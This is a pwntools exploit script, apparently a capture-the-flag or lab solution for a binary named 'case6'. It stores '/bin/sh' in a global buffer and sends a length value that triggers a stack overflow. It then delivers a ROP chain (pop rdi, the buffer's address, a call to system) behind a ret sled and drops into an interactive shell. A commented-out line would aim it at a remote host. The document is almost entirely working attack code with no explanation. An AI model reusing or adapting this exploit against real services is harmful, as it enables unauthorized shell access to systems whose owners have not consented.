from struct import pack
from pwn import *

ret = p64( 0x401CDE ) # ret
call_system = 0x401C38
username_bss = 0x04AB560
pop_rdi = 0x0000000000401766

if __name__ == "__main__":

	p = process( "./case6" )
	#p = remote( '127.0.0.1', 33050 )
	#gdb.attach( p, "b *0x401CDE" )

	p.recvuntil( ": " )
	p.send( "/bin/sh\n" )

	p.recvuntil( ": " )
	p.send( "257\n" )

	rop_chain = p64( pop_rdi )
	rop_chain += p64( username_bss )
	rop_chain += p64( call_system )

	payload = ret * ( ( 256 - len( rop_chain ) ) / 8 )
	payload += rop_chain
	payload += '\x00'

	p.recvuntil( ": " )
	p.send( payload + '\n' )

	p.interactive()

	p.close()